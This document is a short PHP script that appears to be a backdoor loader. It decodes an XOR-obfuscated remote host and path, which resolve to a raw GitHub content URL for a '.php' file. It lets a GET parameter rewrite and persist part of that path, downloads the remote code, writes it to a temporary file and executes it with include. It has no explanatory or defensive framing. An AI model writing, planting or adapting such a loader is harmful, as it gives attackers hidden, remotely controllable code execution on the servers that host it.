<?php
function fetchRemoteContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        $content = curl_exec($ch);
        if (curl_errno($ch)) {
            curl_close($ch);
            return false;
        }
        curl_close($ch);
        return $content;
    }
    elseif (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    }
    else {
        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            return false;
        }
        $host = $parts['host'];
        $port = isset($parts['port']) ? $parts['port'] : 80;
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $fp = fsockopen($host, $port, $errno, $errstr, 10);
        if (!$fp) {
            return false;
        }
        $request = "GET $path$query HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "Connection: close\r\n\r\n";
        fwrite($fp, $request);
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 1024);
        }
        fclose($fp);
        if (strpos($response, "\r\n\r\n") !== false) {
            list(, $body) = explode("\r\n\r\n", $response, 2);
            return $body;
        }
        return false;
    }
}
function localXorEncryptDecrypt($data, $key) {
    $output = '';
    $keyChar = substr($key, 0, 1);
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($keyChar));
    }
    return $output;
}
$customValueFile = 'x-anny-anax.ium';
$defaultSegment = "xannyanaxium";
$queryParam = "llz";

if (isset($_GET[$queryParam])) {
    $newSegment = $_GET[$queryParam];
    file_put_contents($customValueFile, $newSegment);
    $pathSegment = $newSegment;
} else {
    if (file_exists($customValueFile)) {
        $pathSegment = file_get_contents($customValueFile);
    } else {
        $pathSegment = $defaultSegment;
    }
}
$_ = "!";
 $url = localXorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
 $path = localXorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
 $exx = localXorEncryptDecrypt("QIQ", $_);
$pc = $path . $pathSegment . $exx;
$remotePayload = fetchRemoteContent("https://$url$pc");
if ($remotePayload === false) {
    echo "Failed to fetch remote payload.";
    exit;
}
$parts = str_split($remotePayload, 4);
$obfuscatedPayload = implode('', $parts);
$tempFile = tempnam(sys_get_temp_dir(), $exx);
file_put_contents($tempFile, $obfuscatedPayload);
include $tempFile;
unlink($tempFile);
?>
